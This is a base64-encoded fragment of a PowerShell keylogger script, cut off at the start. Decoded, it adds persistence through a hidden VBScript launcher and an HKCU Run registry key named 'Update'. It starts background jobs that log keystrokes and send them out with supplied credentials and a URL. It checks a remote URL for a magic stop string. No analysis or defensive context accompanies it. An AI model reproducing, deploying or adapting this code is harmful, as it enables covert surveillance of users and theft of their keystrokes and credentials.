V0LldlYkNsaWVudAogICAgICAgICAgICAgICAgJGZpbGVjb250ZW50ID0gJHdlYmNsaWVudC5Eb3dubG9hZFN0cmluZygiJENoZWNrVVJMIikKICAgICAgICAgICAgICAgIGlmICgkZmlsZWNvbnRlbnQgLWVxICRNYWdpY1N0cmluZykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKCiAgICAkbW9kdWxlbmFtZSA9ICRzY3JpcHQ6TXlJbnZvY2F0aW9uLk15Q29tbWFuZC5OYW1lCiAgICBpZigkcGVyc2lzdCAtZXEgJFRydWUpCiAgICB7CiAgICAgICAgJG5hbWUgPSAicGVyc2lzdC52YnMiIAogICAgICAgICRvcHRpb25zID0gInN0YXJ0LWpvYiAtSW5pdGlhbGl6YXRpb25TY3JpcHQgYCRmdW5jdGlvbnMgLXNjcmlwdGJsb2NrIHtLZXlwYXN0ZSAkYXJnc1swXSAkYXJnc1sxXSAkYXJnc1syXSAkYXJnc1szXSAkYXJnc1s0XSAkYXJnc1s1XSAkYXJnc1s2XSAkYXJnc1s3XX0gLUFyZ3VtZW50TGlzdCBAKCRFeGZpbE9wdGlvbiwkZGV2X2tleSwkdXNlcm5hbWUsJHBhc3N3b3JkLCRVUkwsJEF1dGhOUywkTWFnaWNTdHJpbmcsJENoZWNrVVJMKSIKICAgICAgICAkb3B0aW9uczIgPSAic3RhcnQtam9iIC1Jbml0aWFsaXphdGlvblNjcmlwdCBgJGZ1bmN0aW9ucyAtc2NyaXB0YmxvY2sge0tleWxvZ2dlciAkYXJnc1swXSAkYXJnc1sxXX0gLUFyZ3VtZW50TGlzdCBAKCRNYWdpY1N0cmluZywkQ2hlY2tVUkwpIgogICAgICAgICRmdW5jID0gJGZ1bmN0aW9ucy5Ub3N0cmluZygpCiAgICAgICAgT3V0LUZpbGUgLUlucHV0T2JqZWN0ICckZnVuY3Rpb25zID0gIHsnIC1Gb3JjZSAkZW52OlRFTVBcJG1vZHVsZW5hbWUKICAgICAgICBPdXQtRmlsZSAtSW5wdXRPYmplY3QgJGZ1bmMgLUFwcGVuZCAkZW52OlRFTVBcJG1vZHVsZW5hbWUKICAgICAgICBPdXQtRmlsZSAtSW5wdXRPYmplY3QgJ30nIC1BcHBlbmQgLU5vQ2xvYmJlciAkZW52OlRFTVBcJG1vZHVsZW5hbWUKICAgICAgICBPdXQtRmlsZSAtSW5wdXRPYmplY3QgJG9wdGlvbnMgLUFwcGVuZCAtTm9DbG9iYmVyICRlbnY6VEVNUFwkbW9kdWxlbmFtZQogICAgICAgIE91dC1GaWxlIC1JbnB1dE9iamVjdCAkb3B0aW9uczIgLUFwcGVuZCAtTm9DbG9iYmVyICRlbnY6VEVNUFwkbW9kdWxlbmFtZQogICAgICAgICAgIAogICAgICAgIE5ldy1JdGVtUHJvcGVydHkgLVBhdGggSEtDVTpTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5cIC1OYW1lIFVwZGF0ZSAtUHJvcGVydHlUeXBlIFN0cmluZyAtVmFsdWUgJGVudjpURU1QXCRuYW1lIC1mb3JjZQogICAgICAgIGVjaG8gIlNldCBvYmpTaGVsbCA9IENyZWF0ZU9iamVjdChgIldzY3JpcHQuc2hlbGxgIikiID4gJGVudjpURU1QXCRuYW1lCiAgICAgICAgZWNobyAib2JqU2hlbGwucnVuKGAicG93ZXJzaGVsbCAtbm9leGl0IC1XaW5kb3dTdHlsZSBIaWRkZW4gLWV4ZWN1dGlvbnBvbGljeSBieXBhc3MgLWZpbGUgJGVudjp0ZW1wXCRtb2R1bGVuYW1lYCIpIiA+PiAkZW52OlRFTVBcJG5hbWUKCiAgICB9ICAKCiAgICBlbHNlCiAgICB7CiAgICAgICAgaWYgKCRleGZpbCAtZXEgJFRydWUpCiAgICAgICAgewogICAgICAgICAgICBzdGFydC1qb2IgLUluaXRpYWxpemF0aW9uU2NyaXB0ICRmdW5jdGlvbnMgLXNjcmlwdGJsb2NrIHtLZXlwYXN0ZSAkYXJnc1swXSAkYXJnc1sxXSAkYXJnc1syXSAkYXJnc1szXSAkYXJnc1s0XSAkYXJnc1s1XSAkYXJnc1s2XSAkYXJnc1s3XX0gLUFyZ3VtZW50TGlzdCBAKCRFeGZpbE9wdGlvbiwkZGV2X2tleSwkdXNlcm5hbWUsJHBhc3N3b3JkLCRVUkwsJEF1dGhOUywkTWFnaWNTdHJpbmcsJENoZWNrVVJMKQogICAgICAgICAgICBzdGFydC1qb2IgLUluaXRpYWxpemF0aW9uU2NyaXB0ICRmdW5jdGlvbnMgLXNjcmlwdGJsb2NrIHtLZXlsb2dnZXIgJGFyZ3NbMF0gJGFyZ3NbMV19IC1Bcmd1bWVudExpc3QgQCgkTWFnaWNTdHJpbmcsJENoZWNrVVJMKQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBzdGFydC1qb2IgLUluaXRpYWxpemF0aW9uU2NyaXB0ICRmdW5jdGlvbnMgLXNjcmlwdGJsb2NrIHtLZXlsb2dnZXIgJGFyZ3NbMF0gJGFyZ3NbMV19IC1Bcmd1bWVudExpc3QgQCgkTWFnaWNTdHJpbmcsJENoZWNrVVJMKQogICAgICAgIH0KICAgIH0K
